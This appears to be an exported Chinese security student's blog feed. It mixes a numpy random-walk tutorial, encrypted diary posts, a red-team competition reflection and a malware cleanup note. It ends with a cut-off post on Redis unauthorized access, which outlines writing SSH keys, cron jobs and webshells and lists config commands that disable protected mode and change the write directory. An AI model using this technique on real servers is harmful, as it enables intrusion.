class="line"> [<span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">0</span> <span class="number">2</span>]]]</span><br></pre></td></tr></table></figure><p>argmax() 返回相应维度axis上的最⼤值位置。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">arr = np.array([</span><br><span class="line"> [<span class="number">1</span>,<span class="number">3</span>,<span class="number">4</span>],</span><br><span class="line"> [<span class="number">5</span>,<span class="number">10</span>,<span class="number">4</span>]</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(arr.argmax(<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(arr.argmax(<span class="number">0</span>))</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">arr = np.array([</span><br><span class="line"> [<span class="literal">False</span>,<span class="literal">True</span>,<span class="literal">False</span>],</span><br><span class="line"> [<span class="literal">True</span>,<span class="literal">False</span>,<span class="literal">True</span>]</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(arr.argmax(<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(arr.argmax(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">[<span class="number">1</span> <span class="number">0</span>]</span><br><span class="line">[<span class="number">1</span> <span class="number">0</span> <span class="number">1</span>]</span><br></pre></td></tr></table></figure><h2 id="随机漫步"><a href="#随机漫步" class="headerlink" title="随机漫步"></a>随机漫步</h2><p>​    想象一个喝醉的人，在一条直线马路上，走哪边呢，左还是右呢，是随机的，设左为0，右为1。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 随机漫步</span></span><br><span class="line">arr = np.random.randint(<span class="number">0</span>, <span class="number">2</span>, <span class="number">1000</span>)</span><br><span class="line"><span class="comment"># print(draws)</span></span><br></pre></td></tr></table></figure><p>​    假设为抛硬币，正面赢得这块钱，反面则要给一块钱。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 随机漫步</span></span><br><span class="line">arr = np.random.randint(<span class="number">0</span>, <span class="number">2</span>, <span class="number">1000</span>)</span><br><span class="line"><span class="comment"># print(draws)</span></span><br><span class="line">arr = np.where(arr == <span class="number">0</span>,-<span class="number">1</span>,arr)  <span class="comment"># 为什么标为-1?  因为钱是+1 -1</span></span><br><span class="line"><span class="built_in">print</span>(arr)</span><br><span class="line"></span><br><span class="line">//赢了多少钱？</span><br><span class="line"><span class="built_in">print</span>(arr.cumsum()) </span><br><span class="line"></span><br><span class="line">//找到赚到<span class="number">10</span>块钱的位置</span><br><span class="line"><span class="built_in">print</span>(</span><br><span class="line">    (arr.cumsum()&gt;=<span class="number">10</span>).argmax()  <span class="comment"># 找到赚到10块钱的位置</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><h2 id="课后练习"><a href="#课后练习" class="headerlink" title="课后练习"></a>课后练习</h2><p>随机漫步问题考虑的是一个胜率50%，赔率2.00 的赌博游戏，例如对于数组[ 1 , -1 , 1 , - 1….] 来说，分别是[ win, lose, win, lose ….] 的输赢数组，类似于抛硬币游戏。书上考虑的是5000局，每局1000次的赌博游戏的结果。</p><p> 问题来了，假设我有一个赌博游戏，分别考虑以下两种情况：</p><p>1，胜率50%，赔率2.10，即[ 1.1,-1,1.1,1.1….] 结果（里面1.1 的情况占50%）的游戏，我想知道如果我玩5000局，每局10000次，到最后，我每局最后的结果的平均值是多少 ？ </p><p>2，胜率53%，赔率2.00，即[ 1,-1,1,1….] 结果（里面1 的情况占53%）的游戏，我想知道如果我玩5000局，每局10000次，到最后，我每局最后的结果的平均值是多少 ？</p><h3 id="问题1"><a href="#问题1" class="headerlink" title="问题1"></a>问题1</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 胜率 %50 赔率2.1 最后的结果的平均值</span></span><br><span class="line"></span><br><span class="line">arr = np.random.randint(<span class="number">0</span>, <span class="number">2</span>, (<span class="number">5000</span>,<span class="number">10000</span>))</span><br><span class="line">arr = np.where(arr == <span class="number">0</span>,-<span class="number">1</span>,<span class="number">1.1</span>)<span class="comment"># 该赔率为2.1</span></span><br><span class="line">fin_arr = arr.cumsum(<span class="number">1</span>).mean(<span class="number">0</span>)<span class="comment"># 对横列累积和的结果数组进行纵向求平均值 得到的数组为fin_arr</span></span><br><span class="line"><span class="built_in">print</span>(fin_arr[-<span class="number">1</span>])<span class="comment"># 取in_arr数组里最后一项，也就是每局最后的结果的平均值。</span></span><br></pre></td></tr></table></figure><p><img src="https://menge-bucket.oss-cn-beijing.aliyuncs.com/Note_img/image-20220929101037772.png" alt="image-20220929101037772"></p><p>验证一下 期望:</p><p><img src="https://menge-bucket.oss-cn-beijing.aliyuncs.com/Note_img/image-20220929101129112.png" alt="image-20220929101129112"></p><h3 id="问题2"><a href="#问题2" class="headerlink" title="问题2"></a>问题2</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 胜率 %53 赔率2.0 最后的结果的平均值</span></span><br><span class="line"></span><br><span class="line">arr = np.random.randint(<span class="number">1</span>, <span class="number">101</span>, (<span class="number">5000</span>,<span class="number">10000</span>))  <span class="comment"># 1到100有100个数，[1,100]，这里使用[1,101)即可表示出[1,100]</span></span><br><span class="line">arr = np.where(arr &gt; <span class="number">53</span>,-<span class="number">1</span>,<span class="number">1</span>)<span class="comment"># 输的局，取出大于53的值，赋值为-1，否则就是赢的局。</span></span><br><span class="line">fin_arr = arr.cumsum(<span class="number">1</span>).mean(<span class="number">0</span>)         <span class="comment"># 对横列累积和的结果数组进行纵向求平均值 得到的数组为fin_arr</span></span><br><span class="line"><span class="built_in">print</span>(fin_arr[-<span class="number">1</span>])           <span class="comment"># 取出fin_arr数组里最后一项，也就是每局最后的结果的平均值。</span></span><br></pre></td></tr></table></figure><p><img src="https://menge-bucket.oss-cn-beijing.aliyuncs.com/Note_img/image-20220929101201199.png" alt="image-20220929101201199"></p><p>验证一下 期望:</p><p><img src="https://menge-bucket.oss-cn-beijing.aliyuncs.com/Note_img/image-20220929101257521.png" alt="image-20220929101257521"></p>]]></content>
      
      
      <categories>
          
          <category> python数据分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 数据分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>五年</title>
      <link href="/2022/07/18/%E4%BA%94%E5%B9%B4/"/>
      <url>/2022/07/18/%E4%BA%94%E5%B9%B4/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="d240c04e44cb8c499da27276f333cc8fa57f9881f16587547b1c1357c1bc8090">ef6f905cd21d9db15b370272c009fc1a3259aeb7e7efd821013cf5a6ecc688f891e81be99af61580dec2461d3f558528580972cb790b5d09e212e261b001a973866ae22d85d72f479db15be85efdb38c63660ad40e17aaa92ce916f26d9ad37a60915ae4e73a70e6755c946f48738abb9a50f84875ef26dc20875a688b2372dcc74f961a46f01f3887a58005666c8904436d1de24892e8be227c6a3ce602e88a9dd4ceb29f9af97263aa3d1f6b48f9e6cc3c317ad518e31ee21ceafbc9899fac538090a3eb631b67cca950f44c1e0ddcaab4ef1d193951767f62a135e1193e1b0a0a58d77cf94f0ea814dc266d9ae3b8aeaec3bf5fe934704718d93f3eb30c05dcccdc567d37fba6cbb5718588f44c6704bf4057d0320de7014ae0a9a061c2392bfb964d4a991cd898a67d51438edadb968e161d1727809160520dc8400b40eb01b174ca26fd1016eb85bdc883d143514245bb8fcc766d7b3c3c2fff5ef1dc3d1cbb29298165b845a6a9115d8a3782433927aa88b245df582c435ba82c7bbd88b630e8df3248e67ee18b59106861a458433ece8459dca13a802f09fe218fe0d5</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-xray">      <input class="hbe hbe-input-field hbe-input-field-xray" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-xray" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-xray">Hey, password is required here.</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-xray" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>        <path d="M0,2.5c0,0,298.666,0,399.333,0C448.336,2.5,513.994,13,597,13c77.327,0,135-10.5,200.999-10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 和自己的对话 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>佛山市飞鸿杯的总结</title>
      <link href="/2022/07/15/%E4%BD%9B%E5%B1%B1%E5%B8%82%E9%A3%9E%E9%B8%BF%E6%9D%AF%E7%9A%84%E6%80%BB%E7%BB%93/"/>
      <url>/2022/07/15/%E4%BD%9B%E5%B1%B1%E5%B8%82%E9%A3%9E%E9%B8%BF%E6%9D%AF%E7%9A%84%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>这次比赛拿了非专业组第一，总排名第七，还是挺不错的，但是这种市HVV真的是经验不足，真的很不满意。</p><p>第一名是绿盟的两个实习生，也是和我们一样大三到大四，太猛了，干了三万分以上，实属羡慕了。</p><p>总结了一下这次自己的缺点：</p><p>1.信息收集速度过慢<br>2.漏洞发现，外网快速打点能力弱<br>3.漏洞复现知识不牢固<br>4.知识遗忘，一些知识不牢固<br>5.攻击方式单一</p><p>我感觉可能实力方面差不了太多和他们，但是他们漏洞发现的速度真的很快，以及一些漏洞复现的比较多，我划水太久了，技术都没有掌握好，新漏洞也没有好好关注，不过这都不是借口，菜是就菜，这次真的很菜。</p><p>脆弱的内网就那么几个，都是要抢的，快速的资产收集然后打点是真的很重要。自己的一些poc，工具，指纹，啥的都是自己的积累吧，真的要好好积累这些，打红队的话这些都是必不可少的，还有内网渗透的快速去打，内网的知识要精湛。</p><p>加油吧。</p><p>先好好考研，考研之后可以找公司去实习一下。</p><p>CTF，红队，代码能力，研究，我都要！！！</p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>记一次服务器被黑</title>
      <link href="/2022/06/30/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%A2%AB%E9%BB%91/"/>
      <url>/2022/06/30/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%A2%AB%E9%BB%91/</url>
      
        <content type="html"><![CDATA[<p><img src="https://menge-bucket.oss-cn-beijing.aliyuncs.com/Note_img/image-20220630142526873.png" alt="image-20220630142526873"></p><p>发现自己服务器一直自动运行一个程序</p><p>看看网络 这么多外连 </p><p><img src="https://menge-bucket.oss-cn-beijing.aliyuncs.com/Note_img/image-20220630150629405.png" alt="image-20220630150629405"></p><p>立马感觉自己被黑了。。不过服务器上没啥东西，无所谓哈哈。</p><p>乘机学习一下应急+溯源</p><h3 id="把样本放到微步和virustotal上分析"><a href="#把样本放到微步和virustotal上分析" class="headerlink" title="把样本放到微步和virustotal上分析"></a>把样本放到微步和virustotal上分析</h3><p>微步 </p><p><img src="https://menge-bucket.oss-cn-beijing.aliyuncs.com/Note_img/image-20220630142824882.png" alt="image-20220630142824882"></p><p><img src="https://menge-bucket.oss-cn-beijing.aliyuncs.com/Note_img/image-20220630142919750.png" alt="image-20220630142919750"></p><p><img src="https://menge-bucket.oss-cn-beijing.aliyuncs.com/Note_img/image-20220630143014337.png" alt="image-20220630143014337"></p><p>很明显经过UPX处理 进行了持久化和网络探测</p><p><img src="https://menge-bucket.oss-cn-beijing.aliyuncs.com/Note_img/image-20220630143503270.png" alt="image-20220630143503270"></p><p><img src="https://menge-bucket.oss-cn-beijing.aliyuncs.com/Note_img/image-20220630143509961.png" alt="image-20220630143509961"></p><p><img src="https://menge-bucket.oss-cn-beijing.aliyuncs.com/Note_img/image-20220630143700372.png" alt="image-20220630143700372"></p><p>推测是某些APT组织吧</p><h3 id="清理"><a href="#清理" class="headerlink" title="清理"></a>清理</h3><p>在微步的建议里清理到所有可疑进程，然后下载了360杀毒再搞了一遍。</p><p>再netstat -ano看一下</p><p><img src="https://menge-bucket.oss-cn-beijing.aliyuncs.com/Note_img/image-20220630151004832.png" alt="image-20220630151004832"></p><p>219是我自己ip 连接的3389</p><p><img src="https://menge-bucket.oss-cn-beijing.aliyuncs.com/Note_img/image-20220630151421985.png" alt="image-20220630151421985"></p><p>结束清理完毕。</p><p>过半个小时再检查一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano | findstr ESTABLISHED</span><br><span class="line">tasklist /svc | findstr &lt;PID&gt;</span><br></pre></td></tr></table></figure><p><img src="https://menge-bucket.oss-cn-beijing.aliyuncs.com/Note_img/image-20220630163235716.png" alt="image-20220630163235716"></p><p><img src="https://menge-bucket.oss-cn-beijing.aliyuncs.com/Note_img/image-20220630163325726.png" alt="image-20220630163325726"></p><p>处理完毕。</p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> talks </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>考研日记</title>
      <link href="/2022/06/23/%E8%80%83%E7%A0%94%E6%97%A5%E8%AE%B0/"/>
      <url>/2022/06/23/%E8%80%83%E7%A0%94%E6%97%A5%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="f69294607bce489dd5b1815dc124e2be025148fafbe56cdc616540605d78775c">ef6f905cd21d9db15b370272c009fc1afb96861e3335d02841cb64d68cb674fd849b8bfaae964c30ce75add87cfefb7d77f62e4f408b0bccfbd8d791216a89c0913b08c7b1cc4cd338be4b59f995489d670c1141c4b6d513ac9bb8800e8d35e41f4b71c2d6925eab5012eb5bc30b1dfb8558fd79395365cb450124ac62d7dfd21ebe7fb39051685398c35d7abece80a775e16948239eda22323371ca813a0229eff43b48452d5bb48914657593c6a6182d4f44f8dab2792aa3bb5498034a6e9791f2bf7521710c52396766a73eb9a919703a049195ead807fbad546b2a3deb9abb15a0fd30e1fe8dab2ccdb60732249aacd921c594e05fc583d224d821d921ec1862cb240a991ec70e06dde81235743e29c8f3b71bfe773fab973eebb5fa2ee7cf9a0616af0a17e4a9f91b9af537f93d21a18c4d7548bf942fb766e09a26bf512e6fbb47e5a2f62f91a6eb2afec98423d86a64df013386184fa1480dd6acc494bb46828ac5e3cdc1c36e92dfe50fc4c5a340b6db39cfe2832a878fcfa38675c3d61e679b991808ba198063f13b611380e22ed18ad7bb7de15884dbf16427ee5b721189025358f396e84df64babd7c68332d7944b27e433f58d7ec77af013a13f307c1b55d8ec29d437c18e27c235e37c19a8d6f07df3ef593f06a0d66600276436540efa8038f5e64536037098683dcc5be1759ebc4d749e6ff918e5e0aae5454faca1a4fd16c1a8a0bc6eedd8572d916faa2e9b49de23d1bc4c7d7e73dfa2aa71414afbc8bf6e2e78231cb0e6bcc0f636cbc96cf353e6139e3452700dda739025c90487028d5e4db3f4550ef3c6af8049d03c14d2e565b171a51e3b975bc94af89efc2a1034d13d2a1fcd33207f97cb63be7625da6f4b7f8cc12b990136a14bdb5106e7e75bf5caf3d2505b346c1f6d7c8517fa7a7e867eaff7c3049a3ebe7a74876b24f6c3b6ed9eb9fa9fe86459dd6fc1344d636ac97231be8184961727abb247ee4ef6de78d5f017dd18f29eef5b0c7711ebefe84cd782628096ed8c41a6c05b50f60b77dfaa2c8e54d544d8edcd9894aa5c142c20e1855c960be4a414d15d4983999619b7ee2181443b8f1bba62c0c27340b87146d3432a045fa01ae4b8a61127e7dc51cddcd75d931fae925c5939cb886e905ef7fe0445e3abd7059d1d32fcd4b0f5decfa1c35787f7ee8a4448b90cd67ead55fbc7285aa943241a92f8e0b156b44c07586256dd0b4d308aeb031a620352422824ca31a486976408eca73e01908af8f0223812cd06cc7426d04a3af02cf1060587fdd2ef6a8bf105390320e036168e07a0f0bd89121953e6facd649bbd1f6756085c5278a7e10587c8be11448f9a5277e27fe99c851d9c76831f559821aa5671948a823ae3aca298e2ff21fe32e500004a1fa6f0d8496bb94d6311d1e91697edbeb9a09bd967ee397f5a030d2c96d57484df677b86cb31bf598552f92f48527831c0e0c38e9e51f68748127c8a0cdde72133ee748011d3037277c7b2ec7191c8ae7557b5e95c45faf1b54a648790a8a4af3aed05ce0d91c51ae0fd490cb5968a0eda69e22da40bf295089798062fcd9c8f134c6b098944a697ce322eda83a9c369256ffc2d51d06881b89031bee5e0304f9cffb1c4210564169fff7d9972bec5467def7f21574465285dbe43b87f7702923b99fbeda4c87f3d9dac8f5711dd921f69ff028f2dfb1d323bf1afff4fa998a793e73d6077ca1580d7db8eb1ba75efe43d5ab569c9ee0addc250d86f77820c280fd05b3fe2305e20e7252536ae8de50d9ac7010ce2adfbed15ec769e70797e8b81332a576a91a5b758a10a0af47cc3fb4ccbebf0bd274318a0873efc63b8e4586a3e3694ed2f0eede6dd80cec01fefbfa7090b2fa2da22035255ae4ae8ab4e4e6399ccc39c39d1ee05ddd3fb7e3b00bb2066e2118d530a2e46c0efe1189f654ce402f1c1c655e07493a1b1111be25112d9db698e003f574e9788c2ebc4c49f429814a731401125a692e061fbe4be26b6bd5d18b977d2e27fa09f50a9f0f9877796ea1b5d4696f8bfcc8618493b3819848505e7548a0d0f28d4247ddbdbd7d4d5086ee6c82e0c4c07158bdc6b48980dbcaf417eaa16b38a229b4cb3cd3cd56a40edfa8f3af3ee831e4ececb950899daaf89b35320b350a7ab2445dfd4b7b03a22ab09c7779a0310a4270289a955c744703eaeb3372a9b774645401318109517adab044352482490adcd3665f94d1bf15758f3743f7335ef8f8c7d38ddd1581b92bd25e5a4c83fc8fdd3998a3641b5fd1aa5a970b975631d704de1f71fefdf0fe46e877b78e24545ae52bd85f7cb356c72cfad44a6e67071754e57fb9ee01e759478e40d6ea47402a3a2bea9ffb2d69de638d13c2288c959bb16a5108445f7643ef4878c39875603e2bb69ed86ea504f21ed8f5d77dcc25f9334514b880a385d3c47752559fb32b2b64f50435bc4d570fa7e4e65e52df38b6b6bf4417793a09b325e3db47d6b42a454c6bb02692baa65654daa528157c86bda698895a8b10d5b5e94a0955a1bc3d81a6b2b04eea98dd358a9e67231627c561e861271b4f5cd401aaa9cb6e1ee40ebecf2907c1f0d7de3af5a315efe74ee0ddfdc94e8f2cd8546d5122f0be8ff8cec2b6db108f1dac30fa36e68026f3a5cf75f85723376025c6bd5831053bef50c12f688643372bb6f5a99bb30c15c46252475086fdbc8920e65fa349816635eb9f671e621fba5e08532c1ab3bb429ac10859c83a23822483d80ad8f22f6f3a19fe8126dbb4c1a20ee91772e3d2cef831dd8ac70011b3b3b33fabffddc1006a2cafdbea6adadef35d070dc8942de2dd768ea251184a8c57ac2b95876a4702be25089e49e522b2a72ce3149d8191c67be53d016a231915a989be5462506a8f0e43d791bcb447691675c28d37c98b1962ed6f2ea6a7f2b8cc35cf211b6deebf99cbebb7c580fc7a8df8973d0c40f1e1e7018c53b60ad597c1273502492fe2095b34ee1686157ec52873532f4aa551e2cff07e7a850e94ef59ddb0480ce03382e9e1e320e59a3e22887914da609e9b23fdb5ee8a30263cb8e0902f90b65e4f736d541f4588dc654783c8d8fbcbcdb0041541d24cf45d2c7e3182356ce7b42652e6b4dce626ebe736a992205bd5d3e2a7b411b12a078f53afc0f2586547bcf6bb4a611e48c234a422408b007494dac4d37376c20cebffc5a78a72c5497827402db825ba411a067c0ec75e1f8bd434a6654da9490e77a602a23ebc844a1b53d615e8c6dbbfa420436405be39d1a6460bde8ae1e2dc89851ab40091992cd15a0834c3fa13a9dcc2cd07ad435c6475bc505ab5f1951245179889a3cc3221f35b6b194f871835d1bf865079caaaac64e5a73671d0a97cdb0e94fbb398fc2c4f9447be8df80d2cfee2f1d64160fb159b77b8e34fb855992b23ed5fb7533b59f5360656390ecce44db316c37adf49b357cc6dbecd50cabdeb8ef56694d7c3a460ba3ed7c87918ac4bf05b8e3def6007ad546817b6ecc4c23aadc8d19b1593c82008d1a95a9ab55aa700235aec7860cb0802faf99f01c900726a2f05bdbca4753155bf4a22e488b2e957a11dc73577d5bd50775bc821df0ff3c487ce82a2314bcccbf2ecd4dedfd731a704a016fdf4064d556c5fbc87f20992a827e65b667fe88e30abc0d978b8f026e9826dba0952eb2d679a21fd3d78a81f33afc3b00dcf595fde4f71ef185bc66f9264a93f8be9934f6c15fb8b981edf0400229efda72f7d49487fe18ce14c3987c1258ead4cbb928864f0b58632fe8512719f2aaf69bad34b5e85b7e17a103d6b2c6f41a98540038562e07319c7adf7baa7dcd47c99fe83858c7a5e5bece8e28ec0c9301d44292c33b1d9c63a2948ed4fa9da8586538c823d831f333dc196a6a7352e7dd5f78e03962adb1d78241de1fb4ea2642f46d435abbb8f5725fa5a5fe3e2610f19418c7d048f0752d8a655965d70cdc9b673fbf5e56c5dfa7b358fcc0ab613d3967521aafd8f56ea212c93d457d8d5d38d0a1c5e46f93b9a050abb888c4cdc6180013ffb2c826290b6255f91ba8ce93985c9f8bdebea173bf57bd9f22f4897890bad2099f9371a106bbcbc7f7ea68bcae87186024050514f153832264dc825e8eb5f0c90aa165752daf281305e2ffd2bd98281d02e2bbceacf4de27a2dc6ec9f6e2ba9b7a1f00cd93620dc20f6d894409981a9e10468cf715e48c10176530de83bdf0511276e8ecff39712a02f52b5cddc8f31e4c2b0f42c09263125ec1cc0bdd5937a618160a4e62d980cdb9947285a9b7a284f0d291a00b481c56a7663f5b207018ae339463a062ef30ec878fe935b61ae1bc2d39c6e3f000bad5c588cb5a790f88318b1cafce8435ec17f64facbf5f5bd9cec12f1836a731f6274d8a3b9440e7b79a87ffd201e6b8365561204829a62e528f8b8b35a6d0bc3cf7bedb9042a0ce9f5e4d9457574a36a7df1f265bcf1f84a0c84908bfb92d113c7802e81f773f7221e1e4e46b2719b70d1fd1bd</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-xray">      <input class="hbe hbe-input-field hbe-input-field-xray" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-xray" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-xray">Hey, password is required here.</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-xray" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>        <path d="M0,2.5c0,0,298.666,0,399.333,0C448.336,2.5,513.994,13,597,13c77.327,0,135-10.5,200.999-10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 和自己的对话 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>随便talk</title>
      <link href="/2022/06/06/%E9%9A%8F%E4%BE%BFtalk/"/>
      <url>/2022/06/06/%E9%9A%8F%E4%BE%BFtalk/</url>
      
        <content type="html"><![CDATA[<p>2022.6.6 晴朗的天气。</p><span id="more"></span><p>今天是2022.6.6，对于生于00年的我，在这个世界已经待了22年了。</p><p>他们说，18岁之后你的人生就像开了加速器，以两倍的倍速去播放。</p><p>一转眼，回头望去，好快！</p><p>好像自己经历了很多事情，又好像什么也没有经历，自己还是那个衰小孩。</p><p>有些人想做什么事情都能做成功。而有些人想做什么事情三天就放弃，比如我。</p><p>自己从未认真的全力以赴的去努力把一件事情做好，所以其实我一直很羡慕两种人，这两种人都有经过我身边，甚至最好的例子就是一起考专升本考试的他们，因为订不到酒店，和我组在一起，三人行，志添和锐滨。</p><p>志添，计算机科学专业，为了网工证准备了差不多半年，为了插本准备了差不多一年，他持续的努力，每一次都是全力以赴，结果就是他去了广技师大学，从开学就准备了研究生入学考试，想必此时此刻的他也是在努力学习吧。</p><p>锐滨，年纪好像比我大个两三岁吧，在外工资1.2W，一个月时间，一边上班一边备考插本，结果随便考考都是400多分，排名第22，这也代表他想上什么学校就上什么学校了，现在在华南师范大学读一年了，不知道他会不会打算考研，我想也许会吧。</p><p>一个极为努力，一个极为聪明。</p><p>而我呢，备考三个月，一直玩玩学学，最近考了306分，网工证书也是摆烂一边玩玩学习，结果最后考完查成绩差几分，最后去了一个民办学校，广东东软学院。</p><p>从17岁考完高考的那个夏天，我就已经很迷茫于整个人生了，现在22岁，好像开启了一些选择项，但依然迷茫。</p><p>我的习惯和心态导致我做什么事情很难去做好，什么事情都是半途而废，三天打鱼两天晒网，学习一个小时，累了休息，我能玩九个小时的游戏。</p><p>跑步跑完一圈休息很久，才继续跑。其实我都明白啊，人生的很多就像公交车和跑步一样，公交车是你的选择，考试考的怎样，排名前的坐车通往好的学校，选择更好的资源。跑步的话，坚持跑不要停，就一定快过那些停下的人很多很多。</p><p>没错，坚持是很难的，对于我。从开学9月份说考研，说3月份好好准备，结果到了6月份的今天，还是没有怎么开始，作业也是拖到最后才提交，拖延是我很大很大的毛病。</p><p>今年将会是我人生的一个很重要的转折点，好好对待吧，萌。</p><p>我可是偶尔会发疯的人啊！坚定目标，全力以赴。去吧，我们的火，会燃烧整个世界！！！</p>]]></content>
      
      
      <categories>
          
          <category> 和自己的对话 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> talks </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2022/06/04/Hello%20World/"/>
      <url>/2022/06/04/Hello%20World/</url>
      
        <content type="html"><![CDATA[<p>2022.6.4 重拾博客。</p><span id="more"></span>]]></content>
      
      
      
        <tags>
            
            <tag> 博客历史 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Redis未授权漏洞总结</title>
      <link href="/2021/05/07/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
      <url>/2021/05/07/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的config 命令，可以进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的 /root/.ssh 文件夹的authotrized_keys 文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器、添加计划任务、写入Webshell等操作。</p><h1 id="Redis常用命令"><a href="#Redis常用命令" class="headerlink" title="Redis常用命令"></a>Redis常用命令</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">set xz &quot;Hacker&quot;                     # 设置键xz的值为字符串Hacker</span><br><span class="line">get xz                              # 获取键xz的内容</span><br><span class="line">SET score 857                       # 设置键score的值为857</span><br><span class="line">INCR score                          # 使用INCR命令将score的值增加1</span><br><span class="line">GET score                           # 获取键score的内容</span><br><span class="line">keys *                              # 列出当前数据库中所有的键</span><br><span class="line">config set protected-mode no        # 关闭安全模式</span><br><span class="line">get anotherkey                      # 获取一个不存在的键的值</span><br><span class="line">config set dir /root/redis          # 